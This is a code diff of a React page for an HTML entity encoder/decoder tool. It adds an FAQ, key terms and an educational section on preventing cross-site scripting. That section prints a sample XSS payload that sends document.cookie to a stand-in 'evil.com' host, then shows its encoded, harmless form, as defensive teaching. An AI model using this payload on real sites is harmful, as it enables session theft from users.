@@ -1,171 +1,218 @@
 
-'use client';
-
-import React from "react";
 import { PageHeader } from '@/components/page-header';
 import { HtmlEntityEncoderDecoder } from './html-entity-encoder-decoder';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
 import { StructuredData } from '@/components/structured-data';
 import { Lightbulb, AlertTriangle, BookOpen, ChevronRight, Wand, ArrowRightLeft, Copy } from 'lucide-react';
-import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
-import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 import Link from 'next/link';
 
 export const metadata = {
     title: 'HTML Entity Encoder / Decoder | ICT Toolbench',
-    description: 'Easily encode and decode HTML entities to safely display special characters and code snippets on your website. Real-time, client-side conversion.',
+    description: 'Instantly convert special HTML characters to their entity names or numbers (e.g., < to &lt;) and back. A crucial tool for safely displaying code and text in HTML.',
+    openGraph: {
+        title: 'HTML Entity Encoder / Decoder | ICT Toolbench',
+        description: 'Encode and decode HTML entities to prevent rendering issues and cross-site scripting (XSS) vulnerabilities.',
+        url: '/tools/html-entity-encoder-decoder',
+    }
 };
 
 const faqData = [
-    { question: "What are HTML entities?", answer: "HTML entities are pieces of text ('strings') that begin with an ampersand (&) and end with a semicolon (;). They are used to display reserved characters (which would otherwise be interpreted as HTML code), and invisible characters (like non-breaking spaces)." },
-    { question: "Why do I need to encode HTML entities?", answer: "You need to encode them to prevent the browser from misinterpreting your text as HTML code. For example, if you want to display the text '<p>This is a paragraph.</p>' literally on your webpage, you must encode the '<' and '>' characters as '&lt;' and '&gt;'. Otherwise, the browser would render it as an actual HTML paragraph." },
-    { question: "What is the difference between an entity name and an entity number?", answer: "Most entities have both a name (e.g., `&copy;` for copyright) and a number (e.g., `&#169;`). They render the same character. Names are easier to remember, but numbers are better supported across all character sets. This tool uses named entities where available." },
-    { question: "Is this tool safe for sensitive data?", answer: "Yes. All encoding and decoding operations happen entirely within your browser. No data is sent to any server." },
-    { question: "What are 'unreserved' characters?", answer: "Unreserved characters are those that do not have a special meaning in a URL and do not need to be encoded. They include uppercase and lowercase letters (A-Z, a-z), digits (0-9), and the special characters `-`, `_`, `.`, and `~`." },
-    { question: "What happens if I try to decode a string that isn't properly encoded?", answer: "The decoder will only convert valid entity sequences (like `&amp;` or `&#169;`). Any other text will remain as-is. If it encounters a malformed entity (like `&amp`), it might not convert it correctly." },
-    { question: "Can I encode non-ASCII characters like 'é' or '€'?", answer: "Yes. This tool encodes a wide range of common non-ASCII characters into their respective HTML entities (e.g., `&eacute;` and `&euro;`), ensuring they are displayed correctly in any HTML document." },
-    { question: "How is this different from URL encoding?", answer: "HTML entity encoding is for safely displaying text within an HTML document. URL encoding (or percent-encoding) is for safely passing data within a URL's query string. They solve different problems and use different formats. You can use our URL Encoder/Decoder for that purpose." },
-    { question: "Should I encode all special characters?", answer: "It is best practice to encode at least the five main reserved HTML characters: & < > \" '. Encoding other characters like the copyright symbol © ensures they are displayed correctly regardless of the document's character set." },
-    { question: "Why does a space sometimes appear as `&nbsp;`?", answer: "The `&nbsp;` entity stands for Non-Breaking Space. It's used when you want to ensure that a space is rendered and prevents a line break from occurring at that point, which can be useful for formatting." },
+    { question: "What are HTML entities?", answer: "HTML entities are pieces of text ('strings') that begin with an ampersand (`&`) and end with a semicolon (`;`). They are used to display reserved characters that have special meaning in HTML (like `<` which defines a tag), or characters that are not on a standard keyboard." },
+    { question: "Why do I need to encode HTML entities?", answer: "Encoding is necessary to display literal special characters as text. If you want to show the code `<p>Hello</p>` on your webpage, you must encode the `<` and `>` characters as `&lt;` and `&gt;`. If you don't, the browser will interpret `<p>Hello</p>` as an actual HTML tag and render it, instead of displaying the code itself." },
+    { question: "Is this a security tool?", answer: "Yes, in a way. Properly encoding user-generated content before displaying it on a page is a critical defense against Cross-Site Scripting (XSS) attacks. If a user enters `<script>alert('hacked')</script>` and you render it directly into your HTML, the script will execute. By encoding it to `&lt;script&gt;alert('hacked')&lt;/script&gt;`, you ensure it is displayed as harmless text." },
+    { question: "What is the difference between a named entity and a numbered entity?", answer: "A named entity is a memorable name (e.g., `&copy;` for the copyright symbol). A numbered entity uses the character's Unicode code point in either decimal (`&#169;`) or hexadecimal (`&#x00A9;`). All modern browsers support both, but named entities are more readable in code." },
+    { question: "Is it safe to use this tool with sensitive data?", answer: "Yes. All encoding and decoding operations happen entirely within your web browser using JavaScript. Your data is never sent to our servers, ensuring it remains private." },
+    { question: "Does this tool encode all possible entities?", answer: "This tool focuses on the five most critical characters for preventing HTML rendering issues and XSS: `&`, `<`, `>`, `\"`, and `'`." },
+    { question: "How does this relate to URL encoding?", answer: "They solve similar problems but for different contexts. HTML entity encoding makes text safe to display inside an HTML document. URL encoding makes text safe to include in a URL's address bar. They use different escape characters (`&` vs `%`) and encode different sets of characters. Use our <a href='/tools/url-encoder-decoder' class='text-primary hover:underline'>URL Encoder/Decoder</a> for that purpose." },
+    { question: "What is the `<code>` tag in HTML?", answer: "The `<code>` tag is used to display a fragment of computer code. While it often renders the text in a monospace font, it does *not* automatically escape the HTML within it. You must still encode special characters inside a `<code>` tag if you want to display them literally." }
 ];
 
 const howToSchema = {
     '@context': 'https://schema.org',
     '@type': 'HowTo',
     name: 'How to Use the HTML Entity Encoder/Decoder',
-    description: 'A guide to encoding and decoding URL strings.',
+    description: 'A guide to encoding and decoding HTML special characters.',
     step: [
-        { '@type': 'HowToStep', name: 'Enter Text', text: 'To encode, type or paste your plain text into the "Decoded" text area. To decode, paste your encoded string into the "Encoded" text area.' },
-        { '@type': 'HowToStep', name: 'View Instant Results', text: 'As you type in one box, the corresponding encoded or decoded text will instantly appear in the other box.' },
-        { '@type': 'HowToStep', name: 'Copy the Output', text: 'Click the "Copy" button above the output box you need to copy its contents to your clipboard.' },
-        { '@type': 'HowToStep', name: 'Swap and Clear', text: 'Use the "Swap" button to switch the content between the boxes or the "Clear" button to reset both text areas.' }
+        { '@type': 'HowToStep', name: 'Enter Text', text: 'To encode, type or paste your plain text (containing characters like <, >, &) into the top "Decoded" box. To decode, paste your entity-encoded text (containing &lt;, &gt;, &amp;) into the bottom "Encoded" box.' },
+        { '@type': 'HowToStep', name: 'View Instant Results', text: 'The tool works in real-time. As you type in one box, the correctly converted text will instantly appear in the other.' },
+        { '@type': 'HowToStep', name: 'Copy or Swap', text: 'Use the copy button to grab the output, or the swap button to switch the contents of the two text boxes.' },
     ],
-    totalTime: 'PT1M',
+    totalTime: 'PT1M'
 };
 
 const keyTerminologies = [
-    { term: 'HTML Entity', definition: 'A string used to represent reserved characters in HTML, starting with `&` and ending with `;` (e.g., `&lt;` for <).' },
-    { term: 'Reserved Characters', definition: 'Characters like `<`, `>`, and `&` that have a special meaning in HTML syntax.' },
-    { term: 'Character Set', definition: 'A defined list of characters recognized by computer hardware and software (e.g., ASCII, UTF-8).' },
-    { term: 'Percent-Encoding', definition: 'The encoding mechanism used for URLs, which is different from HTML entity encoding. Use a URL Encoder for this.' },
-    { term: 'Non-Breaking Space', definition: 'An HTML entity (`&nbsp;`) that creates a space that will not be collapsed by the browser and prevents a line break.' },
+    { term: 'HTML Entity', definition: 'A string of text that begins with an ampersand (`&`) and ends with a semicolon (`;`), used to represent special or reserved characters.' },
+    { term: 'Character Encoding', definition: 'The process of converting characters into a format that can be safely rendered or transmitted.' },
+    { term: 'Reserved Characters', definition: 'Characters that have a special meaning in HTML syntax, such as `<` (starts a tag) and `>` (ends a tag).' },
+    { term: 'XSS (Cross-Site Scripting)', definition: 'A web security vulnerability that allows an attacker to inject malicious scripts into content that is then delivered to other users\' browsers.' },
+    { term: 'Monospace Font', definition: 'A font where every character occupies the same amount of horizontal space, commonly used for displaying code.' },
 ];
 
+
 export default function HtmlEntityEncoderDecoderPage() {
-  const faqSchema = {
-    '@context': 'https://schema.org',
-    '@type': 'FAQPage',
-    mainEntity: faqData.map(item => ({
-      '@type': 'Question',
-      name: item.question,
-      acceptedAnswer: {
-        '@type': 'Answer',
-        text: item.answer.replace(/<[^>]*>?/gm, ''),
-      },
-    })),
-  };
+    const faqSchema = {
+        '@context': 'https://schema.org',
+        '@type': 'FAQPage',
+        mainEntity: faqData.map(item => ({
+            '@type': 'Question',
+            name: item.question,
+            acceptedAnswer: {
+                '@type': 'Answer',
+                text: item.answer.replace(/<[^>]*>?/gm, ''),
+            },
+        })),
+      };
+    
+      const softwareAppSchema = {
+        "@context": "https://schema.org",
+        "@type": "SoftwareApplication",
+        "name": "HTML Entity Encoder / Decoder",
+        "operatingSystem": "All",
+        "applicationCategory": "DeveloperApplication",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        },
+        "description": "A free, client-side tool to encode and decode special HTML characters to and from their entity representations, useful for displaying code and preventing XSS.",
+        "url": "https://www.icttoolbench.com/tools/html-entity-encoder-decoder"
+      };
 
-  return (
-    <>
-      <StructuredData data={faqSchema} />
-      <StructuredData data={howToSchema} />
-      <div className="max-w-4xl mx-auto space-y-12">
-          <PageHeader
-              title="HTML Entity Encoder / Decoder"
-              description="Convert text to HTML entities to safely display special characters and code, or decode entities back to plain text."
-          />
-          <HtmlEntityEncoderDecoder />
-          <section>
-              <h2 className="text-2xl font-bold mb-4">How to Use This Tool</h2>
-              <Card className="prose prose-sm max-w-none text-foreground p-6">
-                  <p>This tool provides real-time, two-way conversion for HTML entity encoding.</p>
-                  <ol>
-                      <li><strong>Live Conversion:</strong> As you type in either box, the other will update instantly with the converted content.</li>
-                      <li><strong>To Encode:</strong> Type or paste your plain text with special characters (e.g., <strong>&lt;h1&gt;Title&lt;/h1&gt;</strong>) into the top "Decoded" box. The safe HTML entity version will appear in the "Encoded" box.</li>
-                      <li><strong>To Decode:</strong> Paste text containing HTML entities (e.g., <strong>&amp;lt;p&amp;gt;</strong>) into the bottom "Encoded" box to see the original plain text.</li>
-                      <li><strong>Swap & Copy:</strong> Use the `Swap` button (<ArrowRightLeft className="inline h-4 w-4" />) to instantly switch the contents of the two boxes. Use the `Copy` icon (<Copy className="inline h-4 w-4" />) above either box to copy its content to your clipboard.</li>
-                  </ol>
-              </Card>
-          </section>
-          
-          <section>
-              <h2 className="text-2xl font-bold mb-4">Key Terminologies</h2>
-              <Card>
-                  <CardContent className="p-6">
-                      <dl className="space-y-4">
-                          {keyTerminologies.map((item) => (
-                              <div key={item.term}>
-                                  <dt className="font-semibold">{item.term}</dt>
-                                  <dd className="text-muted-foreground text-sm">{item.definition}</dd>
-                              </div>
-                          ))}
-                      </dl>
-                  </CardContent>
-              </Card>
-          </section>
+      return (
+        <>
+            <StructuredData data={faqSchema} />
+            <StructuredData data={howToSchema} />
+            <StructuredData data={softwareAppSchema} />
+            <div className="max-w-4xl mx-auto space-y-12">
+                <PageHeader
+                    title="HTML Entity Encoder / Decoder"
+                    description="Safely display code and special characters in your HTML. This tool converts reserved characters to their corresponding HTML entities and back again, helping you prevent display issues and Cross-Site Scripting (XSS) vulnerabilities."
+                />
+                <HtmlEntityEncoderDecoder />
 
-           <Card className='bg-secondary/30 border-primary/20'>
-              <CardHeader>
-                  <div className='flex items-center gap-2 text-primary'>
-                      <BookOpen className="h-6 w-6" aria-hidden="true" />
-                      <CardTitle className="text-primary">Educational Deep Dive</CardTitle>
-                  </div>
-                  <CardDescription>Understand why displaying code and special symbols on a web page requires special handling.</CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-6 prose prose-lg max-w-none text-foreground">
-                  <section>
-                      <h3 className="font-bold text-xl">The Browser's Dilemma: Code vs. Content</h3>
-                      <p>A web browser's primary job is to interpret HTML code and render a visual page. This creates a problem: what if you want to <strong>display</strong> a piece of HTML code as text, instead of having the browser render it? If you write <code>&lt;p&gt;</code> in your HTML file, the browser will create a paragraph. It has no way of knowing you just wanted to show the literal characters '&lt;', 'p', and '&gt;'.</p>
-                      <p>HTML entities are the solution to this problem. They are a special syntax that tells the browser, "Do not interpret this as code; instead, display the character that this entity represents." By converting reserved characters into their entity equivalents, we can safely include any text or code snippet on a webpage without breaking the layout or structure.</p>
-                  </section>
-              </CardContent>
-          </Card>
+                <section>
+                <h2 className="text-2xl font-bold mb-4">How to Use This Tool</h2>
+                <Card className="prose prose-sm max-w-none text-foreground p-6">
+                    <p>This tool provides real-time, two-way conversion for HTML entities. It helps you safely display text that contains characters with special meaning in HTML.</p>
+                    <ol>
+                        <li><strong>Live Conversion:</strong> The tool works instantly. As you type in either text box, the other will update immediately with the converted content.</li>
+                        <li><strong>To Encode:</strong> Type plain text containing special characters (like `&lt;div class="container"&gt;`) into the top "Decoded" box. The safe, encoded version will appear in the bottom "Encoded" box.</li>
+                        <li><strong>To Decode:</strong> Paste text containing HTML entities (like `&amp;lt;p&amp;gt;Hello&amp;lt;/p&amp;gt;`) into the bottom "Encoded" box. The original plain text will appear in the top "Decoded" box.</li>
+                        <li><strong>Swap & Copy:</strong> Use the `Swap` button (<ArrowRightLeft className="inline h-4 w-4" />) to instantly switch the contents of the two boxes. Use the `Copy` icon (<Copy className="inline h-4 w-4" />) to copy the contents of either box to your clipboard.</li>
+                    </ol>
+                </Card>
+                </section>
+                
+                <section>
+                <h2 className="text-2xl font-bold mb-4">Key Terminologies</h2>
+                <Card>
+                    <CardContent className="p-6">
+                        <dl className="space-y-4">
+                            {keyTerminologies.map((item) => (
+                                <div key={item.term}>
+                                    <dt className="font-semibold">{item.term}</dt>
+                                    <dd className="text-muted-foreground text-sm">{item.definition}</dd>
+                                </div>
+                            ))}
+                        </dl>
+                    </CardContent>
+                </Card>
+                </section>
 
-          <div className="grid md:grid-cols-2 gap-8">
-              <Card>
-                  <CardHeader>
-                      <div className='flex items-center gap-2'><Wand className="h-6 w-6 text-accent" /> <CardTitle>Pro Tips & Quick Hacks</CardTitle></div>
-                  </CardHeader>
-                  <CardContent>
-                      <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
-                          <li><strong>Use for Code Snippets:</strong> Before displaying sample code (HTML, XML, etc.) on your website inside <code>&lt;code&gt;</code> or <code>&lt;pre&gt;</code> tags, run it through the encoder to ensure it renders as text.</li>
-                          <li><strong>Non-Breaking Spaces:</strong> Use the entity <code>&amp;nbsp;</code> when you need to ensure two words are not separated by a line break.</li>
-                          <li><strong>Copyright & Trademarks:</strong> Quickly find the entities for common symbols like Copyright (<code>&amp;copy;</code>), Registered Trademark (<code>&amp;reg;</code>), and Trademark (<code>&amp;trade;</code>).</li>
-                      </ul>
-                  </CardContent>
-              </Card>
-              <Card>
-                  <CardHeader>
-                       <div className='flex items-center gap-2'><AlertTriangle className="h-6 w-6 text-destructive" /> <CardTitle>Common Mistakes to Avoid</CardTitle></div>
-                  </CardHeader>
-                  <CardContent>
-                       <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
-                          <li><strong>Forgetting to Encode:</strong> Pasting code directly into an HTML file without encoding it first is a common mistake that can break your page layout.</li>
-                          <li><strong>Double Encoding:</strong> Accidentally running already-encoded text through the encoder again. This will encode the ampersands (e.g., <code>&amp;amp;lt;</code>), resulting in incorrect output.</li>
-                          <li><strong>Confusing with URL Encoding:</strong> HTML entity encoding and <Link href="/tools/url-encoder-decoder" className="text-primary hover:underline">URL Encoding</Link> are for different purposes. Use entity encoding for displaying content in HTML, and URL encoding for passing data in URLs.</li>
-                        </ul>
-                  </CardContent>
-              </Card>
-          </div>
-          
-          <section>
-              <h2 className="text-2xl font-bold mb-4">Frequently Asked Questions</h2>
-              <Card>
-                  <CardContent className="p-6">
-                      <Accordion type="single" collapsible className="w-full">
-                          {faqData.map((item, index) => (
-                              <AccordionItem value={`item-${index}`} key={index}>
-                                  <AccordionTrigger>{item.question}</AccordionTrigger>
-                                  <AccordionContent>
-                                    <div dangerouslySetInnerHTML={{ __html: item.answer.replace('URL Encoder/Decoder', "<a href='/tools/url-encoder-decoder' class='text-primary hover:underline'>URL Encoder/Decoder</a>") }} />
-                                  </AccordionContent>
-                              </AccordionItem>
-                          ))}
-                      </AccordionContent>
-                  </Card>
-              </section>
-      </div>
-    </>
-  );
+                <Card className='bg-secondary/30 border-primary/20'>
+                    <CardHeader>
+                        <div className='flex items-center gap-2 text-primary'>
+                            <BookOpen className="h-6 w-6" aria-hidden="true" />
+                            <CardTitle className="text-primary">Educational Deep Dive: Displaying Code Safely</CardTitle>
+                        </div>
+                        <CardDescription>From showing code examples to preventing XSS, understand why HTML entity encoding is a fundamental web development practice.</CardDescription>
+                    </CardHeader>
+                    <CardContent className="space-y-6 prose prose-lg max-w-none text-foreground">
+                        <section>
+                            <h3>The Problem: Code is Text, But So Is HTML</h3>
+                            <p>
+                                The HyperText Markup Language (HTML) uses specific characters to define its structure. The less-than (`<`) and greater-than (`>`) signs are the most important, as they are used to open and close tags. This creates a problem: what if you want to actually *display* the character `<` or a snippet of HTML code on your webpage?
+                            </p>
+                            <p>If you write `<p>This is a paragraph.</p>` in your HTML source, the browser will render it as a paragraph. But if you want to *show* that code as text, you can't just write it as-is, because the browser will interpret it as an instruction. This is where HTML entities come in.</p>
+                        </section>
+                        <section>
+                            <h3>The Solution: HTML Entities</h3>
+                            <p>
+                                An HTML entity is a special code that the browser renders as a specific character. It allows you to display reserved characters literally, without them being interpreted as HTML code. For example, to display `<p>`, you would write `&lt;p&gt;`. The browser sees `&lt;` and knows to render it as a literal `<` character.
+                            </p>
+                        </section>
+                        <section>
+                            <h3>A Critical Security Practice: Preventing XSS</h3>
+                            <p>
+                                HTML entity encoding is not just for displaying code; it's a critical security measure against <strong>Cross-Site Scripting (XSS)</strong> attacks. If your website has a comments section and you display user comments directly, an attacker could submit a comment like:
+                            </p>
+                             <div className="bg-muted p-4 rounded-md font-code text-sm">
+                                <pre>
+        {`<script>document.location='http://evil.com/steal-cookie?c=' + document.cookie;</script>`}
+                                </pre>
+                            </div>
+                            <p>
+                                If you render this directly, the malicious script will run in the browser of every other user who views the page, potentially stealing their session cookies and hijacking their accounts. By encoding the user's input before displaying it, the malicious comment is transformed into harmless text that the browser will simply display, not execute:
+                            </p>
+                             <div className="bg-muted p-4 rounded-md font-code text-sm">
+                                <pre>
+        {`&lt;script&gt;document.location='http://evil.com/steal-cookie?c=' + document.cookie;&lt;/script&gt;`}
+                                </pre>
+                            </div>
+                             <p>
+                                **Always encode any user-generated content before rendering it in your HTML.**
+                            </p>
+                        </section>
+                    </CardContent>
+                </Card>
+
+                <div className="grid md:grid-cols-2 gap-8">
+                    <Card>
+                        <CardHeader>
+                            <div className='flex items-center gap-2'><Wand className="h-6 w-6 text-accent" /> <CardTitle>Pro Tips</CardTitle></div>
+                        </CardHeader>
+                        <CardContent>
+                            <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
+                                <li><strong>Use in `<pre>` and `<code>` Tags:</strong> When displaying blocks of code, wrap the encoded text in `<pre>` and `<code>` tags. This preserves whitespace and signals to the browser (and other developers) that the content is code.</li>
+                                <li><strong>Server-Side Encoding is Best:</strong> While this tool is great for manual conversion, in a real application, you should always perform entity encoding on the server-side before sending the HTML to the browser. Every modern web framework has a built-in function for this.</li>
+                                <li><strong>Named vs. Numbered Entities:</strong> For common characters, named entities (`&copy;`, `&euro;`) are more readable in your source code than numbered ones (`&#169;`, `&#8364;`).</li>
+                            </ul>
+                        </CardContent>
+                    </Card>
+                    <Card>
+                        <CardHeader>
+                             <div className='flex items-center gap-2'><AlertTriangle className="h-6 w-6 text-destructive" /> <CardTitle>Common Mistakes to Avoid</CardTitle></div>
+                        </CardHeader>
+                        <CardContent>
+                             <ul className="list-disc pl-5 space-y-3 text-sm text-muted-foreground">
+                                <li><strong>Forgetting to Encode:</strong> The most dangerous mistake is to forget to encode user-supplied content, opening a major XSS vulnerability.</li>
+                                <li><strong>Double Encoding:</strong> Encoding text that has already been encoded. This will result in the browser displaying the entity code itself (e.g., you'll see `&amp;lt;` on the page instead of `<`).</li>
+                                <li><strong>Confusing with URL Encoding:</strong> Using HTML entity encoding on a URL parameter, or vice-versa. They are for different purposes and use different syntax.</li>
+                            </ul>
+                        </CardContent>
+                    </Card>
+                </div>
+                
+                <section>
+                    <h2 className="text-2xl font-bold mb-4">Frequently Asked Questions</h2>
+                    <Card>
+                        <CardContent className="p-6">
+                            <Accordion type="single" collapsible className="w-full">
+                                {faqData.map((item, index) => (
+                                    <AccordionItem value={`item-${index}`} key={index}>
+                                        <AccordionTrigger>{item.question}</AccordionTrigger>
+                                        <AccordionContent>
+                                            <div dangerouslySetInnerHTML={{ __html: item.answer }} />
+                                        </AccordionContent>
+                                    </AccordionItem>
+                                ))}
+                            </Accordion>
+                        </CardContent>
+                    </Card>
+                </section>
+            </div>
+        </>
+    );
 }
+
